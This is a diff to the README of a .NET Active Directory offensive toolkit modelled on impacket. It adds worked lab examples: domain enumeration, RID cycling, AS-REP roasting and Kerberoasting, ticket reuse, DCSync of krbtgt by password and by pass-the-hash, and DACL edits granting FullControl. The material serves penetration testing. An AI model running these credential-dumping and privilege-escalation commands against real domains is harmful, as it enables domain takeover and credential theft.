@@ -10,7 +10,7 @@ SMB2/3 · DCERPC (MSRPC) · LDAP · Kerberos · NTLM/SPNEGO · TDS · DCSync · 
 
 [![.NET](https://img.shields.io/badge/.NET-8.0-512BD4?logo=dotnet&logoColor=white)](https://dotnet.microsoft.com/)
 [![CI](https://github.com/SieBRUM/dotnetpacket/actions/workflows/ci.yml/badge.svg)](../../actions/workflows/ci.yml)
-[![Tests](https://img.shields.io/badge/tests-260%20passing-success)](tests/)
+[![Tests](https://img.shields.io/badge/tests-284%20passing-success)](tests/)
 [![Release](https://img.shields.io/github/v/release/SieBRUM/dotnetpacket?include_prereleases&sort=semver)](../../releases)
 
 </div>
@@ -65,12 +65,15 @@ built for Windows, Linux, and macOS on x64 and arm64 — or build it yourself:
 ```bash
 dotnet build -c Release
 dotnet test
-dotnet run --project src/DotNetPacket.Examples    # list every command
+dotnet run --project src/DotNetPacket.Examples                 # list every command, grouped
+dotnet run --project src/DotNetPacket.Examples -- help dcsync  # parameters + examples for one command
 ```
 
 Needs the .NET 8 SDK and NuGet access on first build. Every command below is
 `dotnetpacket <command> …` from a release build (or
-`dotnet run --project src/DotNetPacket.Examples -- <command> …` from source).
+`dotnet run --project src/DotNetPacket.Examples -- <command> …` from source). Run
+`dotnetpacket help <command>` for any command's full parameter list and examples; run
+`dotnetpacket help` for the grouped catalogue with the credential-target and global-option primers.
 
 ## Usage
 
@@ -135,6 +138,68 @@ server — either with `-proxy socks5://…` or transparently through
 **Kerberos over TCP/88** (no UDP fallback), and connections are made **by hostname** so remote DNS
 resolves on the far side of the pivot.
 
+### Examples
+
+Worked flows against the throwaway lab DC (`tools/lab-addc.sh up` prints the credentials). From a
+release build these are `dotnetpacket <command> …`; from source, `dotnet run --project
+src/DotNetPacket.Examples -- <command> …`. Single-quote the whole target so `!`, `@`, `:`, `/` in a
+password reach the parser. `dotnetpacket help <command>` has per-parameter help for any of them.
+
+**Enumerate a domain over SMB / RPC**
+
+```bash
+# who's answering? — reads the NTLM challenge, no credentials
+dotnetpacket smb-ntlminfo 127.0.0.1
+
+# users, groups, and the password policy in one shot (samrdump)
+dotnetpacket rpc-samrdump 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1'
+
+# RID-cycle to enumerate accounts without a directory read
+dotnetpacket lookupsid 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1' 1200
+
+# list shares, then read a file over SMB2
+dotnetpacket rpc-shares 'LAB/Administrator:LabAdm1n!Pass@127.0.0.1'
+dotnetpacket smb2-cat   'LAB/Administrator:LabAdm1n!Pass@127.0.0.1' C$ Windows\\win.ini
+```
+
+**Kerberos — roast, then reuse a ticket**
+
+```bash
+# AS-REP roast (no pre-auth) and Kerberoast (SPN accounts)
+dotnetpacket get-npusers  'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1'
+dotnetpacket get-userspns 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1'
+
+# cache a TGT, then reuse it with -k — the password never goes on the wire again
+dotnetpacket kerb-tgt 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' -save-ccache admin.ccache
+KRB5CCNAME=admin.ccache dotnetpacket get-adusers 'lab.local/Administrator@127.0.0.1' -k
+```
+
+**DCSync (secretsdump)**
+
+```bash
+# one account, with a password
+dotnetpacket dcsync 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' krbtgt
+
+# ... or pass-the-hash, no password on the line (note the leading colon = empty LM)
+dotnetpacket dcsync 'lab.local/Administrator@127.0.0.1' krbtgt -hashes :ac8d0d3c9858659864b8493a51050efd
+
+# the whole domain, authenticated with Kerberos (one host/<dc> ticket seals it all)
+dotnetpacket dcsync-all-k 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' vm.lab.local -k
+```
+
+**Edit an object's DACL, then read it back**
+
+```bash
+dotnetpacket dacledit write 'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' victim attacker FullControl
+dotnetpacket dacledit read  'lab.local/Administrator:LabAdm1n!Pass@127.0.0.1' victim
+```
+
+**Through a SOCKS pivot**
+
+```bash
+dotnetpacket rpc-samrdump 'LAB/Administrator:LabAdm1n!Pass@dc01.lab.local' -proxy socks5://127.0.0.1:1080
+```
+
 ### SMB2/3 — files, shares, recon
 
 | Command | Parameters | impacket | Does |
@@ -184,7 +249,7 @@ resolves on the far side of the pivot.
 | `get-npusers` | `<target> [target-user] [port]` | `GetNPUsers.py` | AS-REP roast (accounts without pre-auth) |
 | `kerb-tgt` | `<target> [port]` | `getTGT.py` | request a TGT (probes the KDC; AES-256 PA-ENC-TIMESTAMP by default, RC4 fallback) |
 | `get-userspns` | `<target> [target-user] [port]` | `GetUserSPNs.py` | Kerberoast SPN accounts |
-| `get-st` | `<dc-host> <service-user> <pass> <domain-fqdn> <impersonate> <target-spn> [port]` | `getST.py` | S4U2self + S4U2proxy — a constrained-delegation ticket impersonating a user |
+| `get-st` | `<domain-fqdn/service-user[:password]@dc-host> <impersonate> <target-spn> [port]` | `getST.py` | S4U2self + S4U2proxy — a constrained-delegation ticket impersonating a user |
 | `getpac` | `<dc-host> <service-user> <domain-fqdn> <impersonate> <service-key-hex> [krbtgt-key-hex] [port]` | `getPac.py` | S4U2self, decrypt the ticket, parse the **PAC** (RID, groups, ExtraSids) and verify its SERVER/KDC signatures |
 | `rpc-changepw` | `<target> <newpass> [port]` | `changepasswd.py` | change a password (SAMR) |
 
